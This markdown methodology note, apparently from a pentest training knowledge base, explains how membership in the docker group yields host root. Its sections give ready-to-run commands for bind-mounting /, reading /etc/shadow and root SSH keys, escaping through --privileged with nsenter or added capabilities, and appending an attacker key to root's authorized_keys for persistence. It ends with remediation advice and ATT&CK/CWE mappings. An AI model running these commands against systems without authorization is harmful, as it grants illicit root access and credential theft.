---
name: docker-group-privesc
description: Becoming root by abusing membership in the `docker` group (or possession of /run/docker.sock) — bind-mount, --privileged, capabilities escape
tags: [methodology, docker, privesc, root, bind-mount, container-escape]
source: Penlearn Local methodology
---

# Docker-Group Privilege Escalation

> If a user is in the `docker` group, they own the host. The docker daemon runs as root and trusts anyone who can talk to `/run/docker.sock`. There is no "least-privilege" docker group — it is functionally equivalent to passwordless `sudo`.

## How to detect it

```bash
id                                           # look for "docker" in groups
getent group docker                          # see who is in the group
ls -la /var/run/docker.sock                  # who can talk to the socket
docker ps                                    # if this works, you can escalate
```

A common pivot scenario: you have a shell as low-priv user A; user B is in the docker group. You need to become user B first (SSH key drop, sudoers misconfig, credential reuse, cred lying in a config) — then the docker route is trivial.

## Foothold #1 — Bind-mount the host root (fastest)

Spawn a container that mounts `/` and either reads or writes root-owned files:

```bash
docker run --rm -v /:/mnt alpine cat /mnt/root/root.txt
```

That single command reads the root flag on an HTB Linux box. Same pattern for the host's `/etc/shadow`, `/root/.ssh/id_ed25519`, `/root/.env`, anything.

To gain a real root shell on the host filesystem (rather than just reading files), chroot into the mount:

```bash
docker run -it --rm -v /:/mnt alpine chroot /mnt /bin/bash
# inside: now uid 0 on the host filesystem (changes persist after `exit`)
```

## Foothold #2 — Privileged container

If bind-mount is somehow restricted (rare — AppArmor, custom profiles), launch a privileged container that shares the host PID/IPC/network namespaces:

```bash
docker run -it --rm --privileged --pid=host --net=host alpine nsenter -t 1 -m -u -i -n -p sh
```

`nsenter -t 1` joins pid 1's namespaces → you are now root on the host without ever mounting its filesystem.

## Foothold #3 — Capability escape

If even `--privileged` is denied, request only the capability you need:

```bash
docker run --rm --cap-add=SYS_PTRACE alpine sh -c 'apk add gdb && gdb -p 1'
docker run --rm --cap-add=SYS_ADMIN alpine sh -c 'mount -t proc proc /proc && cat /proc/1/root/etc/shadow'
```

`CAP_SYS_ADMIN` alone is enough to mount host paths. `CAP_DAC_READ_SEARCH` lets you read any file.

## Foothold #4 — Write authorized_keys via docker

If you want persistent SSH-as-root and don't want to leave a shell history:

```bash
docker run --rm -v /root/.ssh:/host-ssh alpine sh -c 'echo "ssh-ed25519 ... attacker" >> /host-ssh/authorized_keys'
ssh root@TARGET
```

The container runs as uid 0; the bind-mounted `/root/.ssh` is now writable. `authorized_keys` becomes whatever you append.

## Foothold #5 — Image you control (no docker registry needed)

If the box can pull no images (no internet) and has only minimal local images, build one inline from a tar:

```bash
echo 'FROM scratch
COPY . /
CMD ["/bin/sh"]' | docker build -t pwn -f - .
```

Or just use whatever image `docker images` already shows.

## Detection signals

| Signal | Confirms |
|--------|----------|
| `docker ps` succeeds without sudo | You are in the docker group |
| `cat /mnt/root/root.txt` works in the spawned container | Root file read confirmed — flag captured |
| Host process visible from `docker run --pid=host` | PID namespace shared — full host control |
| SSH as root from your tun0 IP succeeds after authorized_keys write | Persistence locked in |

## Defensive note (for the report's remediation section)

There is no safe way to add a user to the docker group. The defensive fix is one of:

1. Remove the user from the docker group; use sudo-wrapped docker commands instead.
2. Run rootless docker (`dockerd-rootless-setuptool.sh install`).
3. Use Podman in rootless mode for the user's container workflow.

Document the alternative in the finding's `remediation` field so the operator knows what to recommend, not just what to break.

## Compliance mapping

- ttp_category: `auth_bypass` / `misconfig` (the privilege boundary is a system-config problem)
- MITRE ATT&CK: T1611 (Escape to Host), T1068 (Exploitation for Privilege Escalation), T1078.003 (Local Accounts)
- OWASP_TOP10: A05 (Security Misconfiguration)
- CWE: CWE-269 (Improper Privilege Management), CWE-250 (Execution with Unnecessary Privileges)

## Cross-Reference

- [[evidence-first]] — five-field template; the test_request is the `docker run ... cat /mnt/root/root.txt` command and observable_effect is the flag content
- [[arcane-cve-chain]] — Arcane runs as root with docker socket access, so admin-in-Arcane → docker-as-root → host root, same chain
